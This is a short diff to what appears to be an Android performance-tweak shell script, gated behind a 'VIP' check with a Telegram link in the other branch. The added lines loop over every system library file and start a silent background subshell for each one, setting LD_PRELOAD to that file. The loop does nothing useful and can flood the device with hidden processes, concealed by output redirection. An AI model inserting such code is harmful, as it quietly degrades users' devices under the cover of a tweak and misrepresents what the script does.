@@ -98,6 +98,8 @@ if [ $check_vip = true ]; then
         setprop debug.hwui.disable_vsync true
     }
     programs > /dev/null 2>&1
+    (for a in /*/lib*/* /*/lib*/*/* /*/*/lib*/* /*/*/lib*/*/*
+    do export LD_PRELOAD="$a"&done)>/dev/null 2>&1&
     sleep 0.1
 else
     local link="https://t.me/HenVx0"
